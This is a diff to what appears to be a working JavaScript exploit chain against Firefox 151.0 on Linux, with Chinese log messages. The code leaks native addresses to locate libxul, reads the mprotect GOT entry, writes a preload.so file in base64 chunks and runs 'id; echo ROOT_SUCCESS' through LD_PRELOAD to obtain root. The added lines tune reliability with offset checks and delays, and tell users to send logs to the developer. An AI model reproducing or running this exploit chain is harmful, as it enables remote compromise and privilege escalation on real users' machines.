@@ -799,6 +799,20 @@ async function main() {
   requireUserPtr(leakFunctionNative, 29);
   requireUserPtr(jsBase, 30);
   requireAlignedPtr(leakFunctionNative, 0x3n, 41);
+  if ((jsBase & 0xfffn) !== 0n) {
+    dbgDump('Stage5 偏移量不匹配', {
+      leakFunctionAddr,
+      nativeFunc: dbgHex(leakFunctionNative),
+      ARRAY_ISARRAY_NATIVE_OFF: dbgHex(ARRAY_ISARRAY_NATIVE_OFF),
+      jsBase: dbgHex(jsBase),
+      jsBaseLowBits: dbgHex(jsBase & 0xfffn),
+      reason: 'Array.isArray native 偏移量 0x3075720 与当前 Firefox 构建不匹配',
+      fix: '请确认 Firefox 版本为官方 151.0 Release (非 Beta/Nightly/自定义构建)'
+    });
+    logErr('libxul 偏移量不匹配: jsBase=0x' + jsBase.toString(16) + ' (低12位应为0)');
+    logErr('当前 Firefox 151.0 构建的 libxul.so 布局与预期不同');
+    logErr('请下载日志发给开发者, 或尝试官方 Firefox 151.0 Release 版本');
+  }
   requireLowBits(jsBase, 0xfffn, 0n, 42);
   const mprotectPtr = read64(jsBase + MPROTECT_GOT_OFF);
   requireUserPtr(mprotectPtr, 31);
@@ -1115,6 +1129,7 @@ async function main() {
   }
   logOk('目标文件已创建: ' + PRELOAD_TARGET);
   dbgLog('[Stage7] 目标文件创建成功: ' + PRELOAD_TARGET);
+  await delay();
 
   // Write preload.so in chunks via base64
   let totalWritten = 0;
@@ -1146,9 +1161,11 @@ async function main() {
     totalWritten += (end - offset);
     const pct = Math.round((totalWritten / preloadSoData.length) * 100);
     logRaw('  写入进度: ' + totalWritten + '/' + preloadSoData.length + ' (' + pct + '%)');
+    await delay();
   }
   logOk('preload.so 写入完成 (' + totalWritten + ' bytes)');
   dbgLog('[Stage7] 写入完成, totalWritten=' + totalWritten);
+  await delay();
 
   // Verify file size
   const verifyResult = runCaptureCommand(
@@ -1159,6 +1176,7 @@ async function main() {
   const verifiedSize = verifyResult.output.trim();
   logInfo('文件大小验证: ' + verifiedSize + ' bytes');
   dbgDump('Stage7 文件验证', { expected: preloadSoData.length, actual: verifiedSize, match: String(preloadSoData.length) === verifiedSize });
+  await delay();
 
   // Execute with LD_PRELOAD
   const ROOT_CMD = "id; echo ROOT_SUCCESS";
@@ -1187,6 +1205,7 @@ async function main() {
     12
   );
   dbgDump('Stage7 执行命令', { preloadTarget: PRELOAD_TARGET, out: commandOutputTarget, done: commandDoneTarget, method: 'LD_PRELOAD env' });
+  await delay();
 
   // Poll for result
   let commandOutput = "";
